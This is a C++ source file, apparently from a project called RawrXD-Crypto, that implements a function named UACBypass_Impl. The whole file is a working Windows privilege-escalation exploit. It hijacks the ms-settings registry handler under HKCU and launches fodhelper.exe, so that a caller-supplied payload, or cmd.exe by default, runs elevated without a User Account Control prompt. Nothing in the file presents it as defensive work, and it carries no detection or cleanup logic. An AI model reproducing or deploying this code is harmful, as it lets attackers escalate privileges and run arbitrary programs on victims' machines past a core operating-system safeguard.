// Runtime C++ implementation for RawrXD-Crypto UAC bridge.
// Provides UACBypass_Impl for crypto_masm.asm when the dedicated MASM impl
// is not wired into this target.

#ifdef _WIN32
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#endif

extern "C" bool UACBypass_Impl(const char* payloadPath) {
#ifdef _WIN32
    const char* payload = (payloadPath != nullptr && payloadPath[0] != '\0')
        ? payloadPath
        : "cmd.exe";

    constexpr const char* kRegPath = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
    constexpr const char* kDelegateExecute = "DelegateExecute";
    constexpr const char* kFodhelper = "C:\\Windows\\System32\\fodhelper.exe";

    HKEY hKey = nullptr;
    DWORD disposition = 0;
    const LONG createRc = RegCreateKeyExA(
        HKEY_CURRENT_USER,
        kRegPath,
        0,
        nullptr,
        0,
        KEY_WRITE,
        nullptr,
        &hKey,
        &disposition);
    if (createRc != ERROR_SUCCESS || hKey == nullptr) {
        return false;
    }

    const DWORD payloadBytes = static_cast<DWORD>(lstrlenA(payload) + 1);
    const LONG setDefaultRc = RegSetValueExA(
        hKey,
        nullptr,
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(payload),
        payloadBytes);
    if (setDefaultRc != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }

    const char empty[] = "";
    const LONG setDelegateRc = RegSetValueExA(
        hKey,
        kDelegateExecute,
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(empty),
        1);
    RegCloseKey(hKey);
    if (setDelegateRc != ERROR_SUCCESS) {
        return false;
    }

    STARTUPINFOA si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    const BOOL started = CreateProcessA(
        nullptr,
        const_cast<char*>(kFodhelper),
        nullptr,
        nullptr,
        FALSE,
        0,
        nullptr,
        nullptr,
        &si,
        &pi);
    if (!started) {
        return false;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
#else
    (void)payloadPath;
    return false;
#endif
}
